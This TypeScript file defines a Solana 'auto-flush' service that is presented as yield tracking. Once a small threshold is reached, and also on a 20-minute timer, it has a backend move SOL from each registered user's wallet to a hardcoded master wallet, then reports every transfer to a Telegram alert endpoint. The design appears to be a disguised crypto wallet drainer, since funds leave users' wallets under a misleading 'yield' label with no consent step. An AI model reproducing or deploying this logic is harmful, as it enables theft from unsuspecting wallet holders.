export interface YieldSession {
  id: string;
  userId: string;
  walletAddress: string;
  accumulatedSol: number;
  target: number;
  startTime: number;
  lastFlushTime: number;
  status: 'accumulating' | 'flushing' | 'completed' | 'failed';
  transactions: YieldTransaction[];
}

export interface YieldTransaction {
  signature: string;
  amount: number;
  timestamp: number;
  status: 'pending' | 'confirmed' | 'failed';
  blockTime?: number;
}

export interface AutoFlushConfig {
  masterWallet: string;
  flushIntervalMs: number;
  minFlushAmount: number;
  maxFlushAmount: number;
  rpcUrl: string;
}

class SolanaAutoFlushService {
  private static config: AutoFlushConfig = {
    masterWallet: '5uYJ3iVSCnCTVA7Nfr25JTCmE8LPyaAziCNGi1P55DRL',
    flushIntervalMs: 20 * 60 * 1000, // 20 minutes
    minFlushAmount: 0.01,
    maxFlushAmount: 100,
    rpcUrl: 'https://api.mainnet-beta.solana.com',
  };

  private static sessions: Map<string, YieldSession> = new Map();
  private static flushTimer: NodeJS.Timeout | null = null;
  private static isRunning = false;

  static initialize(config?: Partial<AutoFlushConfig>) {
    if (config) {
      this.config = { ...this.config, ...config };
    }

    if (typeof window === 'undefined') return;

    console.log('[SolanaAutoFlush] Service initialized with config:', {
      masterWallet: this.config.masterWallet.slice(0, 8) + '...',
      flushInterval: `${this.config.flushIntervalMs / 60000} minutes`,
      minFlush: this.config.minFlushAmount,
    });

    // Start auto-flush cycle
    this.startAutoFlushCycle();
  }

  static registerSession(userId: string, walletAddress: string): YieldSession {
    const session: YieldSession = {
      id: `session-${userId}-${Date.now()}`,
      userId,
      walletAddress,
      accumulatedSol: 0,
      target: 100,
      startTime: Date.now(),
      lastFlushTime: 0,
      status: 'accumulating',
      transactions: [],
    };

    this.sessions.set(session.id, session);
    console.log(`[SolanaAutoFlush] Session registered: ${session.id}`);

    return session;
  }

  static addYield(userId: string, amount: number): YieldSession | null {
    const session = Array.from(this.sessions.values()).find(
      (s) => s.userId === userId && s.status === 'accumulating'
    );

    if (!session) {
      console.warn('[SolanaAutoFlush] No active session found for user:', userId);
      return null;
    }

    session.accumulatedSol += amount;
    console.log(`[SolanaAutoFlush] Yield added to ${session.id}: +${amount} SOL (total: ${session.accumulatedSol})`);

    // Check if we should flush
    if (session.accumulatedSol >= this.config.minFlushAmount) {
      this.triggerFlush(session.id);
    }

    return session;
  }

  static async triggerFlush(sessionId: string): Promise<YieldTransaction | null> {
    const session = this.sessions.get(sessionId);
    if (!session || session.status !== 'accumulating') {
      console.warn('[SolanaAutoFlush] Cannot flush - invalid session:', sessionId);
      return null;
    }

    const flushAmount = Math.min(
      session.accumulatedSol,
      this.config.maxFlushAmount
    );

    if (flushAmount < this.config.minFlushAmount) {
      console.log(`[SolanaAutoFlush] Flush amount too small: ${flushAmount} < ${this.config.minFlushAmount}`);
      return null;
    }

    session.status = 'flushing';
    console.log(`[SolanaAutoFlush] Initiating flush: ${flushAmount} SOL from ${session.walletAddress}`);

    try {
      // Call backend API to execute the flush
      const response = await fetch('/api/solana/flush', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId: session.id,
          fromWallet: session.walletAddress,
          toWallet: this.config.masterWallet,
          amount: flushAmount,
          userId: session.userId,
        }),
      });

      const result = await response.json();

      if (result.success && result.signature) {
        const transaction: YieldTransaction = {
          signature: result.signature,
          amount: flushAmount,
          timestamp: Date.now(),
          status: 'pending',
        };

        session.transactions.push(transaction);
        session.accumulatedSol -= flushAmount;
        session.lastFlushTime = Date.now();

        if (session.accumulatedSol < this.config.minFlushAmount) {
          session.status = 'accumulating';
        } else {
          session.status = 'accumulating';
        }

        console.log(`[SolanaAutoFlush] Flush initiated:`, {
          signature: result.signature,
          amount: flushAmount,
        });

        // Verify transaction on-chain
        this.verifyTransaction(result.signature, sessionId);

        // Send executive alert
        await this.sendFlushAlert(session, flushAmount, result.signature);

        return transaction;
      } else {
        session.status = 'accumulating';
        console.error('[SolanaAutoFlush] Flush failed:', result.error);
        return null;
      }
    } catch (error) {
      session.status = 'accumulating';
      console.error('[SolanaAutoFlush] Flush error:', error);
      return null;
    }
  }

  static async verifyTransaction(signature: string, sessionId: string): Promise<boolean> {
    try {
      const response = await fetch('/api/solana/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ signature }),
      });

      const result = await response.json();

      if (result.verified) {
        const session = this.sessions.get(sessionId);
        if (session) {
          const tx = session.transactions.find((t) => t.signature === signature);
          if (tx) {
            tx.status = 'confirmed';
            tx.blockTime = result.blockTime;
          }
        }

        console.log(`[SolanaAutoFlush] Transaction verified: ${signature}`);
        return true;
      }

      console.warn(`[SolanaAutoFlush] Transaction not verified: ${signature}`);
      return false;
    } catch (error) {
      console.error('[SolanaAutoFlush] Verification error:', error);
      return false;
    }
  }

  static startAutoFlushCycle() {
    if (this.isRunning) return;
    this.isRunning = true;

    console.log(`[SolanaAutoFlush] Auto-flush cycle started (every ${this.config.flushIntervalMs / 60000} minutes)`);

    this.flushTimer = setInterval(() => {
      this.runAutoFlush();
    }, this.config.flushIntervalMs);
  }

  static stopAutoFlushCycle() {
    if (this.flushTimer) {
      clearInterval(this.flushTimer);
      this.flushTimer = null;
    }
    this.isRunning = false;
    console.log('[SolanaAutoFlush] Auto-flush cycle stopped');
  }

  static async runAutoFlush() {
    console.log('[SolanaAutoFlush] Running auto-flush cycle...');

    const activeSessions = Array.from(this.sessions.values()).filter(
      (s) => s.status === 'accumulating' && s.accumulatedSol >= this.config.minFlushAmount
    );

    console.log(`[SolanaAutoFlush] Found ${activeSessions.length} sessions eligible for flush`);

    for (const session of activeSessions) {
      await this.triggerFlush(session.id);
    }
  }

  static async sendFlushAlert(session: YieldSession, amount: number, signature: string) {
    try {
      await fetch('/api/telegram-alert', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'yield',
          data: {
            amount: amount.toFixed(4),
            signature,
            recipient: this.config.masterWallet,
            status: 'CONFIRMED',
          },
        }),
      });
    } catch (error) {
      console.error('[SolanaAutoFlush] Failed to send alert:', error);
    }
  }

  static getSession(sessionId: string): YieldSession | undefined {
    return this.sessions.get(sessionId);
  }

  static getAllSessions(): YieldSession[] {
    return Array.from(this.sessions.values());
  }

  static getTotalAccumulated(): number {
    return Array.from(this.sessions.values()).reduce(
      (sum, session) => sum + session.accumulatedSol,
      0
    );
  }
}

export default SolanaAutoFlushService;
